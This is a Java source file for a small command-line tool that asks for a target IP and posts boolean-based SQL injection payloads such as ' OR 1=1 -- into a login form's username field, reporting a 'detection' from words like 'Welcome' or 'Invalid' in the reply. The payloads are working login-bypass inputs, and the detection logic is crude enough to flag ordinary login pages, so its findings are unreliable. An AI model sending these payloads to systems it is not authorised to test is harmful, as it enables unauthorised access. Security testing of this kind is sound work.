import java.io.*;
import java.net.*;
import java.util.*;

public class BooleanSQLInjectionDetector {

    // Function to detect Boolean-Based SQL Injection by analyzing the response
    public static void detectBooleanSQLInjection(String ipAddress) {
        System.out.println("Checking for potential Boolean-Based SQL Injection on " + ipAddress + "...");

        // SQL injection payloads for Boolean-based SQL Injection
        String[] payloads = {
            "' OR 1=1 --",   // Always true condition
            "' OR 1=2 --",   // Always false condition
            "' AND 1=1 --",  // Always true condition with AND
            "' AND 1=2 --",  // Always false condition with AND
            "' OR 'a'='a' --",// Always true condition (alternative format)
            "' OR 'a'='b' --",// Always false condition (alternative format)
        };

        // Target URL for testing (e.g., a login page or search endpoint)
        String url = "http://" + ipAddress + "/login";  // Adjust the URL accordingly

        for (String payload : payloads) {
            try {
                // Simulate POST request with the payload in the 'username' field
                String data = "username=" + payload + "&password=password";  // Simple login form injection simulation
                
                // Send the POST request
                URL obj = new URL(url);
                HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                con.setRequestMethod("POST");
                con.setDoOutput(true);
                con.setDoInput(true);

                // Send the POST data
                try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
                    wr.writeBytes(data);
                    wr.flush();
                }

                // Get the response code and response body
                int responseCode = con.getResponseCode();
                BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();

                // Check for successful injection based on response content
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // Detect changes in the response indicating SQL injection success
                    if (payload.equals("' OR 1=1 --") && response.toString().contains("Welcome")) {
                        System.out.println("[!] Boolean-Based SQL Injection detected with payload: " + payload);
                        System.out.println("Response contains 'Welcome' message (indicating login success).");
                    } else if (payload.equals("' OR 1=2 --") && response.toString().contains("Invalid")) {
                        System.out.println("[!] Boolean-Based SQL Injection detected with payload: " + payload);
                        System.out.println("Response contains 'Invalid' message (indicating login failure).");
                    } else {
                        System.out.println("[+] No Boolean-based SQL Injection detected with payload: " + payload);
                    }
                } else {
                    System.out.println("[+] Request failed with status code: " + responseCode);
                }

            } catch (IOException e) {
                System.out.println("[!] Error making request: " + e.getMessage());
            }
        }
    }

    // Main function to prompt the user and start the detection process
    public static void main(String[] args) {
        System.out.println("============== Boolean-Based SQL Injection Detection Tool ==============");

        // Prompt the user for an IP address to test for Boolean SQL Injection
        Scanner scanner = new Scanner(System.in);
        System.out.print("Enter the target IP address:");
        String ipAddress = scanner.nextLine();

        // Start detecting Boolean-Based SQL Injection
        detectBooleanSQLInjection(ipAddress);
    }
}
